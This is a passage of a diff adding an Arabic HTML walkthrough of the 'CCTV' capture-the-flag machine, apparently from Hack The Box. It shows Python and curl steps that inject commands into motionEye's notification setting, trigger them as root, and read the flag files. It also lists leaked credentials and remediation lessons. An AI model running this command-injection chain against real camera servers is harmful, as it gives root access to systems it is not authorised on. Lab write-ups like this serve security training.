+    req = urllib.request.Request(<br>
+        url, data=body,<br>
+        headers={'Content-Type': 'application/json'}, method=method<br>
+    )<br>
+    return urllib.request.urlopen(req, timeout=10)<br><br>
+
+<span class="comment"># 1. نحصل على الـ config الحالي</span><br>
+resp = make_req('GET', '/config/1/get')<br>
+current = json.loads(resp.read().decode())<br><br>
+
+<span class="comment"># 2. نضيف أمرنا</span><br>
+current['command_notifications_enabled'] = True<br>
+current['command_notifications_exec'] = <span class="highlight">'/tmp/run.sh'</span><br><br>
+
+<span class="comment"># 3. نحفظ الإعداد</span><br>
+body = json.dumps(current).encode()<br>
+resp2 = make_req('POST', '/config/1/set', body)<br>
+print('SET:', resp2.read().decode())</span><br><br>
+        <span class="output"><span class="highlight">SET: {"reload": false, "reboot": false, "error": null} ✅</span></span>
+      </div>
+
+      <h2>تشغيل الحدث — trigger via emulate_motion</h2>
+      <p>motion daemon يدعم وضع <code>emulate_motion</code> الذي يُحاكي اكتشاف حركة ويُشغّل <code>on_event_start</code>:</p>
+
+      <div class="code-block">
+        <span class="code-lang">bash</span>
+        <span class="cmd">curl -s 'http://localhost:7999/1/config/set?emulate_motion=on'</span><br><br>
+        <span class="output">emulate_motion = on<br>
+Done</span><br><br>
+        <span class="comment"># ننتظر بضع ثوانٍ</span><br>
+        <span class="cmd">sleep 5; cat /tmp/flag.txt</span><br><br>
+        <span class="output"><span class="highlight"><span class="flag-blur">ccf51bf8f9ce6a95b3d44162e433fe9b</span>  🚩 USER FLAG!</span></span>
+      </div>
+
+      <h2>محتوى /tmp/run.sh (الـ Payload)</h2>
+      <div class="code-block">
+        <span class="code-lang">bash — /tmp/run.sh</span>
+        <span class="cmd">#!/bin/sh<br>
+cp /home/sa_mark/user.txt /tmp/flag.txt<br>
+chmod 777 /tmp/flag.txt</span>
+      </div>
+
+      <div class="info-box success">
+        <div class="title">✅ نوع الثغرة</div>
+        <ul>
+          <li><span class="vuln-rce">Remote Code Execution (RCE)</span> عبر تعديل حقل Command في motionEye</li>
+          <li><span class="vuln-misconfig">Insecure Configuration</span>: ملف config يحتوي على credentials قابلة للقراءة</li>
+          <li><span class="vuln-cred">Sensitive Data Exposure</span>: password hash مكشوف لـ mark</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+
+  <!-- Step 7: Privilege Escalation -->
+  <div class="step">
+    <div class="step-header">
+      <div class="step-number step-number-privesc">7</div>
+      <div class="step-title">Privilege Escalation — من user إلى root</div>
+    </div>
+    <div class="step-body">
+      <h2>اكتشاف أن motion يعمل كـ root</h2>
+      <p>استخدمنا نفس الأسلوب لتنفيذ <code>id</code> وحفظ النتيجة:</p>
+
+      <div class="code-block">
+        <span class="code-lang">Python</span>
+        <span class="comment"># نغير الأمر ليكتب id في ملف</span><br>
+        <span class="cmd">current['command_notifications_exec'] = \<br>
+    'id > /tmp/whoami.txt; sudo -l >> /tmp/whoami.txt 2>&1; chmod 777 /tmp/whoami.txt'</span>
+      </div>
+
+      <div class="code-block">
+        <span class="code-lang">bash — نتيجة /tmp/whoami.txt</span>
+        <span class="output"><span class="highlight">uid=0(root) gid=0(root) groups=0(root)</span><br>
+User root may run the following commands on cctv:<br>
+    (ALL : ALL) ALL</span>
+      </div>
+
+      <div class="info-box danger">
+        <div class="title">🔴 اكتشاف خطير!</div>
+        <p><strong>motion daemon يعمل كـ root</strong> — وهذا يعني أي أمر يُشغّله هو root!</p>
+        <p>لماذا هذا خطير؟ لأن motion daemon مُعرَّض لإعادة التكوين عبر motionEye API الذي يمكن لـ mark الوصول إليه.</p>
+      </div>
+
+      <h2>سلسلة privilege escalation</h2>
+      <div class="timeline">
+        <div class="timeline-item">
+          <strong>mark</strong> يستطيع قراءة /etc/motioneye/motioneye.conf
+        </div>
+        <div class="timeline-item">
+          يحصل على admin_password hash من الملف
+        </div>
+        <div class="timeline-item">
+          يحسب HMAC صحيح للـ motionEye API
+        </div>
+        <div class="timeline-item">
+          يُعدّل command_notifications_exec عبر API
+        </div>
+        <div class="timeline-item">
+          يُحاكي motion event عبر motion daemon API
+        </div>
+        <div class="timeline-item">
+          motion daemon (root) يُنفّذ الأمر المحقون
+        </div>
+        <div class="timeline-item">
+          <strong>RCE كـ root!</strong>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Step 8: Root Flag -->
+  <div class="step">
+    <div class="step-header">
+      <div class="step-number step-number-flag">8</div>
+      <div class="step-title">الحصول على Root Flag</div>
+    </div>
+    <div class="step-body">
+      <h2>قراءة /root/root.txt</h2>
+      <div class="code-block">
+        <span class="code-lang">Python — me_root.py</span>
+        <span class="comment"># نغير الأمر ليقرأ root.txt</span><br>
+        <span class="cmd">current['command_notifications_exec'] = \<br>
+    'cat /root/root.txt > /tmp/root.txt; chmod 777 /tmp/root.txt'<br><br>
+<span class="comment"># نحفظ ونُشغّل الحدث</span><br>
+resp2 = make_req('POST', '/config/1/set', body)<br>
+urllib.request.urlopen('http://localhost:7999/1/config/set?emulate_motion=on')<br>
+time.sleep(10)<br>
+print(open('/tmp/root.txt').read())</span><br><br>
+        <span class="output"><span class="highlight"><span class="flag-blur">dc2b1718ef8d7bd689c1deb6c935b5da</span>  🏆 ROOT FLAG!</span></span>
+      </div>
+
+      <div class="flags-box" style="margin-top:20px;">
+        <div class="flag-item">
+          <div class="flag-label">🚩 User Flag</div>
+          <div class="flag-value flag-blur">ccf51bf8f9ce6a95b3d44162e433fe9b</div>
+        </div>
+        <div class="flag-item">
+          <div class="flag-label">🏆 Root Flag</div>
+          <div class="flag-value flag-blur">dc2b1718ef8d7bd689c1deb6c935b5da</div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Lessons Learned -->
+  <div class="step">
+    <div class="step-header">
+      <div class="step-number step-number-flag">📚</div>
+      <div class="step-title">الدروس المستفادة — Lessons Learned</div>
+    </div>
+    <div class="step-body">
+      <table>
+        <tr>
+          <th>المشكلة</th>
+          <th>النوع</th>
+          <th>الحل الصحيح</th>
+        </tr>
+        <tr>
+          <td>admin:admin في ZoneMinder</td>
+          <td><span class="vuln-cred">Default Credentials</span></td>
+          <td>تغيير الكلمة الافتراضية فوراً عند التثبيت</td>
+        </tr>
+        <tr>
+          <td>admin_password hash مقروء لمستخدمين آخرين</td>
+          <td><span class="vuln-misconfig">Insecure File Permissions</span></td>
+          <td>تقييد قراءة /etc/motioneye/ لـ root فقط</td>
+        </tr>
+        <tr>
+          <td>motionEye يسمح بتعديل الأوامر المُنفَّذة</td>
+          <td><span class="vuln-rce">Command Injection via API</span></td>
+          <td>تقييد الوصول لـ API + التحقق من المدخلات</td>
+        </tr>
+        <tr>
+          <td>motion daemon يعمل كـ root</td>
+          <td><span class="vuln-privesc">Unnecessary Privilege</span></td>
+          <td>تشغيل الخدمة بمستخدم محدود (motion user)</td>
+        </tr>
+        <tr>
+          <td>mark:opensesame — كلمة مرور ضعيفة</td>
+          <td><span class="vuln-cred">Weak Credentials</span></td>
+          <td>استخدام كلمات مرور قوية + 2FA</td>
+        </tr>
+      </table>
+
+      <h2 style="margin-top:20px;">مبادئ أمنية انتُهكت في هذا الـ Machine</h2>
+      <ul>
+        <li><strong>Principle of Least Privilege</strong>: motion daemon لا يحتاج صلاحيات root</li>
+        <li><strong>Defense in Depth</strong>: فشل طبقة واحدة أدى لاختراق كامل</li>
+        <li><strong>Secure by Default</strong>: الإعدادات الافتراضية كانت غير آمنة</li>
+        <li><strong>OWASP A05: Security Misconfiguration</strong>: إعدادات خاطئة في كل مكان</li>
+        <li><strong>OWASP A02: Cryptographic Failures</strong>: SHA1 hash مكشوف بدلاً من تشفير صحيح</li>
+      </ul>
+    </div>
+  </div>
+
+  <!-- Footer -->
+  <div class="footer">
+    <p>HTB CCTV — Easy Linux Machine</p>
+    <p style="margin-top:8px; color:#58a6ff;">ZoneMinder → SSH (mark:opensesame) → motionEye API RCE → motion daemon (root) → Flags</p>
+  </div>
+
+</div>
+<script>
+document.querySelectorAll('.flag-blur').forEach(function(el) {
+  el.title = 'انقر للكشف عن الـ Flag';
+  el.addEventListener('click', function() {
+    this.classList.toggle('revealed');
+  });
+});
+</script>
+</body>
+</html>
